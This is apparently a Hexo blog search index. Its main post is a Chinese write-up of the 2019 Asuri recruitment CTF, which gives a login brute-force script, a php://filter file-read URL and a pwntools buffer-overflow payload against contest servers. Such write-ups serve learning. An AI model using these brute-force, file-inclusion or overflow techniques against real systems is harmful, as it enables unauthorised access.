{"meta":{"title":"MiaoTony's小窝","subtitle":"喵喵喵~","description":"喵呜~欢迎各位大佬的来访呀！","author":"MiaoTony","url":"https://miaotony.github.io","root":"/"},"pages":[],"posts":[{"title":"CTF | Asuri战队 2019招新赛 WriteUP","text":"Asuri 招新赛WriteUP 20191117网址： http://139.9.212.218:8000/challenges 官方安排及WriteUP：https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp testflag{this_is_test_flag} misc-签到 base64解码即得到 flag{1_want_jiamus_p0wer} baby-web-九曲十八弯 http://desperadoccy.club:39011/ base64解码 Asuri{view_source&#39;s_power} 快速计算 http://47.102.107.100:39012/ 连续20次在1-2s内判断是否正确，即可得到flag。 1import requests2import re3import time45s = requests.Session()6r = s.get(\"http://47.102.107.100:39012/\")7for i in range(20):8 time.sleep(1)9 equation = re.findall(r'&lt;div&gt;(.*)=(.*)&lt;/div&gt;', r.text)[0]10 print(equation)11 answer = eval(equation[0])12 if answer == eval(equation[1]):13 values = &#123;'answer': 'true'&#125;14 else:15 values = &#123;'answer': 'false'&#125;16 r = s.post(\"http://47.102.107.100:39012/\", data=values)17 r.encoding = 'utf-8'18 print(r.text) Asuri{python_1s_th3_be3t_l4ngu4ge} medium_web_justburp http://139.9.212.218:39010/ 查找网站目录下的文件 访问robots.txt 得到： 访问hint.php 得到一个文件 尝试以admin作为用户名，用以上信息作为密码写脚本进行登录， 然而好像没有成功（有可能有成功的没看到？？？ 难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…加一个if重新来就看到了惹emmm 爆破一波 1# -*- coding:utf-8 -*-2import requests34s = requests.Session()5r = s.get(\"http://139.9.212.218:39010/index.php\")6r.encoding = \"utf-8\"7print(r.text)89with open('name-pass.txt', 'r') as file:10 contents = file.read().split()11 # print(contents)12 passwords = contents1314for password in passwords:15 values = &#123;'name': 'admin',16 'password': password&#125;17 r = s.get(\"http://139.9.212.218:39010/index.php\", params=values)18 r.encoding = 'utf-8'19 if '密码错误' not in r.text:20 print(r.text) 即可得到 1&lt;!DOCTYPE html&gt;2&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;3&lt;title&gt;Hi hacker&lt;/title&gt;4&lt;/head&gt;5&lt;body bgcolor=\"bisque\"&gt;6&lt;form action=\"index.php\" method=\"get\"&gt;用户名：&lt;br&gt;&lt;input type=\"text\" name=\"name\"&gt;&lt;br&gt;密码：&lt;br&gt;&lt;input type=\"text\" name=\"password\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"登陆\"&gt;7&lt;/form&gt;8&lt;p&gt;hint:admin用户的密码似乎在某个页面里 &lt;/p&gt;9&lt;p&gt;10看你骨骼精奇，就将flag交于你了！Asuri&#123;Burp_1s_Gre@t&#125;&lt;/p&gt;11&lt;/body&gt;12&lt;/html&gt; flag: Asuri{Burp_1s_Gre@t} 其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。然而我现场还在搜它怎么用…… hard_web_php是世界上最好的语言 http://139.9.212.218:39009/ 改cookie重发 访问read_file.php，得到 访问no_flag_here.php ，构造参数进入根目录 然而！emmm这个scandir怎么获取这个flag文件内容啊！！！ 看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 构造file=php://filter/read=convert.base64-encode/resource=+绝对路径 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php 或者 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php 得到一串Base64字符串 PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg== 解码后： 1&lt;?php2 //Asuri&#123;WEB_WINNER&#125;3?&gt; flag: Asuri{WEB_WINNER} easy_pwn 1from pwn import * # 引入pwntools库2import time34sh = remote('49.235.243.206', 9001) # 创建与靶场服务器的连接56offset = 0x60+0x8 # 偏移7system_addr = 0x400766 # system函数地址8for i in range(4, 20):9 sh.recvuntil('Please input your passworld size')10 sh.sendline(p64(i)) # 向程序发送数据11 sh.recvuntil('Please input your password')12 payload = offset * b'a' + p64(system_addr) # 构造攻击数据13 sh.sendline(payload) # 向程序发送数据14 sh.interactive() # 将控制流从程序转移到自己这里 完了不会写，嘤嘤嘤 medium_rev1#!/usr/bin/env python2# encoding: utf-83# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc45def encrypt_for_each():6 index = [7 0] * 1008 for i in range(100):9 tmp = i ^ 7710 yield tmp11 None12 131415def encrypt(msg, key):16 iters = encrypt_for_each()17 enc = []18 for (m, k) in zip(msg, key):19 e = m ^ k ^ iters.__next__()20 enc.append(e)21 22 return enc232425def generate_key():26 27 def check_prime(num):28 if num &lt; 2:29 return False30 for i in range(2, num):31 if num % i == 0:32 return False33 return True3435 test = [36 8,37 61,38 85,39 25,40 121,41 53,42 26,43 0,44 81,45 52,46 124,47 22,48 137,49 56,50 94,51 107,52 59,53 132,54 90,55 3,56 51,57 46,58 77,59 127,60 35,61 86,62 134,63 20,64 73,65 32,66 66,67 99,68 7,69 69,70 122,71 4,72 142,73 23,74 80,75 109,76 60,77 79,78 36,79 62,80 5,81 104,82 102,83 14,84 58,85 149,86 31,87 96,88 68,89 114,90 116,91 11,92 95,93 87,94 146,95 123,96 15,97 135,98 33,99 37,100 110,101 19,102 106,103 30,104 130,105 101,106 97,107 98,108 141,109 2,110 47,111 6,112 24,113 131,114 16,115 111,116 150,117 55,118 1,119 76,120 12,121 138,122 64,123 120,124 118,125 29,126 145,127 147,128 9,129 113,130 103,131 40,132 92,133 71,134 72,135 129,136 139,137 100,138 63,139 133,140 42,141 125,142 74,143 88,144 143,145 144,146 38,147 140,148 67,149 119,150 136,151 115,152 54,153 21,154 50,155 108,156 128,157 57,158 112,159 43,160 84,161 70,162 78,163 28,164 41,165 93,166 44,167 13,168 18,169 10,170 48,171 27,172 83,173 65,174 17,175 75,176 126,177 39,178 49,179 91,180 34,181 82,182 45,183 148,184 105,185 89,186 117]187 key = (lambda .0: continue[ i for i in .0 ])(filter(check_prime, test))188 return key189190if __name__ == '__main__':191 key = generate_key()192 msg = [193 22,194 21,195 167,196 66,197 9,198 27,199 3,200 119,201 42,202 99,203 68,204 86,205 13,206 166,207 3,208 120,209 22,210 59,211 9,212 77,213 40,214 3,215 233,216 41,217 67,218 108,219 80,220 179,221 86,222 36,223 31,224 107,225 77,226 4,227 75]228 print('encryt message is &#123;&#125;'.format(msg)) lambda .0: continue[ i for i in .0 ] 这个.0执行不了啊emmm 我换成x也报错唉！ middle_pwn 小结 第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233 除了石榴园的真的没多少打这个比赛的呀。 我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤 现场查BurpSuite怎么用也是绝了（那节培训我没去emmm 总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ 等我有空再折腾一下，搭个博客吧 咕咕咕 20191128 更新：我来折腾了，嘻嘻嘻！","path":"2019/11/28/CTF_2019Asuri_Recruitment/"},{"title":"test","text":"测试一下再来一下哈~ 喵~~嘿嘿嘿","path":"2019/11/28/test/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2019/11/27/hello-world/"}]}